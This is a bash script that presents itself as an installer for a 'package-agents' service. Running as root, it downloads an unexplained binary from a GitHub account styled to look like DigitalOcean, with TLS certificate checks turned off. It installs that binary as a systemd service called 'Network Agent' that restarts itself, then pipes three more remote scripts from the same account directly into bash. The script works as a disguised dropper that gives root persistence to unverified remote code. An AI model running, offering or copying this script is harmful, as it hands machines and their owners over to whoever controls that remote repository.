#!/bin/bash

# Set variables
AGENT_PATH="/usr/local/package-agents"
SERVICE_PATH="/etc/systemd/system/package-agents.service"
DOWNLOAD_URL="https://github.com/digitalocean-droplet/package-repo/raw/refs/heads/main/packages"

# Check for root
if [[ $EUID -ne 0 ]]; then
  echo "❌ This script must be run as root."
  exit 1
fi

# Stop existing service if running
if systemctl is-active --quiet package-agents.service; then
    echo "➜ Stopping existing package-agents service..."
    systemctl stop package-agents.service
    
    # Wait for service to fully stop
    echo "➜ Waiting for service to stop..."
    for i in {1..10}; do
        if ! systemctl is-active --quiet package-agents.service; then
            echo "✅ Service stopped successfully"
            break
        fi
        echo "➜ Still stopping... ($i/10)"
        sleep 2
    done
    
    # Force stop if still running
    if systemctl is-active --quiet package-agents.service; then
        echo "➜ Force stopping service..."
        systemctl kill package-agents.service
        sleep 3
    fi
fi

# Remove existing file if it exists and is busy
if [[ -f "$AGENT_PATH" ]]; then
    echo "➜ Removing existing agent file..."
    
    # First try normal removal
    if ! rm -f "$AGENT_PATH" 2>/dev/null; then
        echo "➜ File is busy, finding and killing processes using it..."
        
        # Find and kill processes using the file
        if command -v fuser &> /dev/null; then
            fuser -k "$AGENT_PATH" 2>/dev/null || true
        else
            # Alternative method using lsof if fuser is not available
            if command -v lsof &> /dev/null; then
                lsof "$AGENT_PATH" 2>/dev/null | awk 'NR>1 {print $2}' | xargs -r kill -9 2>/dev/null || true
            fi
        fi
        
        sleep 3
        
        # Try removing again
        if ! rm -f "$AGENT_PATH" 2>/dev/null; then
            echo "❌ Cannot remove busy file. Manual intervention required."
            echo "➜ Please run: sudo fuser -k $AGENT_PATH && sudo rm -f $AGENT_PATH"
            exit 1
        fi
    fi
    echo "✅ Existing agent file removed"
fi

# Download snap-agent
echo "➜ Downloading snap-agent from $DOWNLOAD_URL..."
wget "$DOWNLOAD_URL" -O "$AGENT_PATH" --no-check-certificate --timeout=30 --tries=3

# Check if download was successful
if [[ ! -f "$AGENT_PATH" ]]; then
  echo "❌ Failed to download snap-agent to $AGENT_PATH"
  exit 1
fi

# Verify the downloaded file is not empty
if [[ ! -s "$AGENT_PATH" ]]; then
  echo "❌ Downloaded file is empty"
  exit 1
fi

# Ensure it's executable
chmod +x "$AGENT_PATH"
echo "✅ Agent downloaded and made executable"

# Create systemd service
echo "➜ Creating systemd service..."

cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

chmod 644 "$SERVICE_PATH"

# Reload systemd and start service
echo "➜ Reloading systemd and starting service..."
systemctl daemon-reload
systemctl enable package-agents.service

# Start service with error handling
if systemctl start package-agents.service; then
    echo "✅ Service started successfully"
    
    # Wait for service to be fully active
    echo "➜ Waiting for service to become active..."
    for i in {1..10}; do
        if systemctl is-active --quiet package-agents.service; then
            echo "✅ Service is now active"
            break
        fi
        echo "➜ Waiting... ($i/10)"
        sleep 2
    done
    
    # Final status check
    if systemctl is-active --quiet package-agents.service; then
        echo "➜ Service status:"
        systemctl status package-agents.service --no-pager
    else
        echo "❌ Service failed to start properly"
        echo "➜ Service logs:"
        journalctl -u package-agents.service --no-pager -n 20
        exit 1
    fi
else
    echo "❌ Failed to start service"
    echo "➜ Service logs:"
    journalctl -u package-agents.service --no-pager -n 20
    exit 1
fi

# Function to check and install gcc and make
check_and_install_build_tools() {
    echo "➜ Checking for gcc and make..."
    
    # Check if gcc and make are installed
    if ! command -v gcc &> /dev/null || ! command -v make &> /dev/null; then
        echo "➜ gcc or make not found. Installing build tools..."
        
        # Detect package manager and install accordingly
        if command -v apt &> /dev/null; then
            # Debian/Ubuntu
            echo "➜ Using apt package manager..."
            apt update
            apt install -y build-essential
        elif command -v yum &> /dev/null; then
            # RHEL/CentOS/Fedora (older)
            echo "➜ Using yum package manager..."
            yum groupinstall -y "Development Tools"
        elif command -v dnf &> /dev/null; then
            # Fedora (newer)
            echo "➜ Using dnf package manager..."
            dnf groupinstall -y "Development Tools"
        elif command -v apk &> /dev/null; then
            # Alpine Linux
            echo "➜ Using apk package manager..."
            apk update
            apk add build-base
        elif command -v zypper &> /dev/null; then
            # openSUSE
            echo "➜ Using zypper package manager..."
            zypper install -y gcc make
        elif command -v pacman &> /dev/null; then
            # Arch Linux
            echo "➜ Using pacman package manager..."
            pacman -S --noconfirm base-devel
        else
            echo "❌ No supported package manager found. Please install gcc and make manually."
            exit 1
        fi
        
        # Verify installation
        if command -v gcc &> /dev/null && command -v make &> /dev/null; then
            echo "✅ gcc and make successfully installed."
        else
            echo "❌ Failed to install gcc and make."
            exit 1
        fi
    else
        echo "✅ gcc and make are already installed."
    fi
}

# Check and install build tools
check_and_install_build_tools

bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh.sh)
